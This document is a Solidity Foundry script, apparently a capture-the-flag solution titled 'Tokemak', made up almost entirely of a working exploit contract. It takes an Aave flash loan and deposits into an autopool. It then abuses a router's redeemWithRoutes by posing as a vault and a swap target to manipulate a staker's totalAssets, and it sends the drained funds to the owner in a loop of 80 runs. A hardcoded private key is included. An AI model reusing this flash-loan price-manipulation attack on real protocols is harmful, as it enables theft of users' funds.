# Tokemak

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "src/tokemak/swapper/SwapRouterV2.sol";
import "src/tokemak/vault/AutopilotRouter.sol";
import "src/Challenge.sol";
import { TransientStorage } from "src/tokemak/libs/TransientStorage.sol";

interface IAAVELendingPool {
    function flashLoan(
        address receiver,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract Exploit {
    address private immutable owner;
    Challenge private immutable chal;
    LFGStaker private immutable lfg;
    SystemRegistry private immutable reg;
    AutopoolETH private immutable apeth;
    IWETH9 private immutable weth;
    ISwapRouterV2 private immutable srouter;
    AutopilotRouter private constant aprouter = AutopilotRouter(payable(0xC45e939ca8C43822A2A233404Ecf420712084c30));
    IAAVELendingPool private constant aave = IAAVELendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    constructor(Challenge _chal) {
        owner = msg.sender;
        chal = _chal;
        lfg = LFGStaker(chal.LFG_STAKER());
        reg = SystemRegistry(chal.SYSTEM_REGISTRY());
        apeth = AutopoolETH(chal.AUTOPOOL_ETH());
        weth = IWETH9(chal.WETH());
        srouter = ISwapRouterV2(payable(address(reg.swapRouter())));

        weth.approve(address(aprouter), type(uint256).max);
        weth.approve(address(aave), type(uint256).max);
        apeth.approve(address(lfg), type(uint256).max);
        apeth.approve(address(aprouter), type(uint256).max);
    }

    function pwn() external {
        if (chal.isSolved()) {
            // console.log("SOLVED!!!");
            return;
        }

        address[] memory assets = new address[](1);
        assets[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100 ether;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        aave.flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            "",
            0
        );

        if (weth.balanceOf(address(this)) > 5 ether) {
            weth.withdraw(weth.balanceOf(address(this)) - 5 ether);
            payable(owner).call{value: address(this).balance}("");
        }
    }

    uint256 private manipulation_mode;
    uint256 private constant _ASSETS_WITH_MANIPULATION = uint256(keccak256(bytes("_ASSETS_WITH_MANIPULATION"))) - 1;

    function _get_assets_with_manipulation() internal returns (uint256) {
        bytes memory b = TransientStorage.getBytes(_ASSETS_WITH_MANIPULATION);
        return abi.decode(b, (uint256));
    }

    function _set_assets_with_manipulation(uint256 v) internal {
        TransientStorage.setBytes(abi.encode(v), _ASSETS_WITH_MANIPULATION);
    }

    uint256 private g_amount = 0.78 ether;

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata /* params */
    ) external returns (bool) {
        ISwapRouterV2.UserSwapData[] memory customRoutes = new ISwapRouterV2.UserSwapData[](1);
        customRoutes[0] = ISwapRouterV2.UserSwapData({
            fromToken: address(0x04C154b66CB340F3Ae24111CC767e0184Ed00Cc6),
            toToken: address(weth),
            target: address(this),
            data: "x"
        });

        uint256 amount = g_amount;
        // console.log("using amount", amount);

        weth.transfer(address(aprouter), amount);
        aprouter.depositBalance(apeth, address(this), 0);

        uint256 assets_without_manipulation = lfg.totalAssets();
        // console.log("lfg.totalAssets() without manipulation", assets_without_manipulation);

        manipulation_mode = 0;
        aprouter.redeemWithRoutes(
            IAutopool(address(this)),
            address(this),
            0,
            0,
            customRoutes
        );
        // console.log("lfg.balanceOf(address(this))", lfg.balanceOf(address(this)));

        manipulation_mode = 1;
        aprouter.redeemWithRoutes(
            IAutopool(address(this)),
            address(this),
            0,
            0,
            customRoutes
        );
        // console.log("lfg.balanceOf(address(this))", lfg.balanceOf(address(this)));
        // console.log("apeth.balanceOf(address(this))", apeth.balanceOf(address(this))/1e18);

        aprouter.redeemMax(apeth, address(this), 0);

        // console.log("weth.balanceOf(address(this))", weth.balanceOf(address(this))/1e18);

        if (_get_assets_with_manipulation() > assets_without_manipulation * 9000 / 10000) {
            amount = amount * 9000 / 10000;
        } 

        g_amount = amount;

        return true;
    }

    function redeem(uint256, address, address) external returns (uint256) {
        if (manipulation_mode == 0) {
            uint256 assets_with_manipulation = lfg.totalAssets();
            _set_assets_with_manipulation(assets_with_manipulation);
            // console.log("lfg.totalAssets() with manipulation", assets_with_manipulation);
            lfg.deposit(apeth.balanceOf(address(this)));
        } else {
            lfg.redeem(lfg.balanceOf(address(this)));
        }
    }

    receive() external payable {}

    fallback (bytes calldata _input) external payable returns (bytes memory _output) {
        if (manipulation_mode == 1) {
            weth.transfer(msg.sender, weth.balanceOf(address(this)));
        }
    }
}

contract ExploitScript is Script {
    uint256 public privateKey = 0x716d50dede5ed7fa9b27d6851d87573d2b9967876309c9b9021268f83503b8da;
    Challenge public chal = Challenge(0xc1c6FDba227B40286c45C3CE7A8316847509bC5f);

    function setUp() public {}

    function run() public {
        vm.startBroadcast(privateKey);
        Exploit e = new Exploit(chal);
        for (uint i = 0; i < 80; i++) {
            // console.log("i", i);
            e.pwn();
        }
        vm.stopBroadcast();
    }

    receive() external payable {}
}
```
